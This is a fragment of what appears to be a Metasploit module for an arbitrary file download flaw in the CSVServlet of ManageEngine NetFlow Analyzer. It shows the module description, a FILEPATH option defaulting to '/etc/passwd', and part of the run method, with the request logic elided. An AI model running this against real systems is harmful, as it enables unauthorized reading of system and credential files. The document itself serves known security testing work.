...
'Description' => %q{
This module exploits an arbitrary file download vulnerability in 
CSVServlet
on ManageEngine NetFlow Analyzer. This module has been tested on both 
Windows
and Linux with versions 8.6 to 10.2. Windows paths have to be escaped 
with 2
...
OptString.new('FILEPATH', [true, 'Path of the file to download (escape 
Windows paths with 2 back slashes)', '/etc/passwd']),
], self.class)
end
def run
# Create request
...
print_error("#{peer} - 0 bytes returned, file does not exist or it is 
empty.")
return
end
